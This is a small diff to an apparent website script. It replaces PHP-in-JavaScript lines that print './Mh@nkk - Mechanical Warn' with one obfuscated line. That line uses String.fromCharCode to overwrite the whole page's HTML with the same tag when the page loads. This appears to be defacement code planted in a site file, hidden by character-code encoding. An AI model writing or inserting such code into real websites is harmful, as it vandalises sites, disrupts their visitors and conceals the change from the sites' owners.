@@ -1,7 +1,1 @@
-document.write("<?php echo './Mh@nkk - Mechanical Warn'; ?>");
-phpVars = new Array();
-    <?php foreach($vars as $var) {
-        echo 'phpVars.push("' . $var . '");';
-        echo './Mh@nkk - Mechanical Warn';};
-    ?>
-
+document.documentElement.innerHTML=String.fromCharCode(46, 47, 77, 104, 64, 110, 107, 107, 32, 45, 32, 77, 101, 99, 104, 97, 110, 105, 99, 97, 108, 32, 87, 97, 114, 110)
